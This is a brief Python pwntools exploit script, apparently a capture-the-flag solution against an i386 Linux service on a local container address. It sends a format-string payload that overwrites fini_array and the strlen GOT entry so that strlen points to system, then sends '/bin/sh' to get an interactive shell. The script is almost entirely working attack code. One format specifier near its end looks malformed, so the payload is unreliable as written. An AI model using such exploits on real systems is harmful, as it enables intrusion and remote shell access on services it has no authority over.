#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.2", 10001)
context.update(arch = 'i386', os = 'linux')

fini_array = 0x08049934	#内容是__do_global_dtors_aux 0x080485a0
start = 0x080484f0		#		
strlen_got = 0x08049a54
system_plt = 0x08048490

io.recv()
io.sendline('aa\x34\x99\x04\x08\x56\x9a\x04\x08\x54\x9a\x04\x08%34000c%12$hn%33556c%13$hn%31884%14c$hn')
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
